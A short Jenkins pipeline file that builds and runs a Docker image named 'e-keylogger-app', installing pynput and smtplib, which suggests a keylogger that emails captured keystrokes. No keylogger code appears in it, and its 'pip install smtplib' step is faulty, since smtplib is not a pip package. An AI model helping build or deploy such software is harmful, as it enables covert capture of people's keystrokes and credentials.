pipeline {
    agent any
    
    stages {
        stage('Build Docker Image') {
            steps {
                script {
                    def dockerImage = docker.build('e-keylogger-app:1.0.1', '.')
                    dockerImage.inside {
                        sh 'python --version'
                        sh 'pip install --no-cache-dir pynput'
                        sh 'pip install --no-cache-dir smtplib'
                    }
                }
            }
        }
        
        stage('Run Docker Container') {
            steps {
                script {
                    docker.image('e-keylogger-app:1.0.1').run('--rm')
                }
            }
        }
    }
}
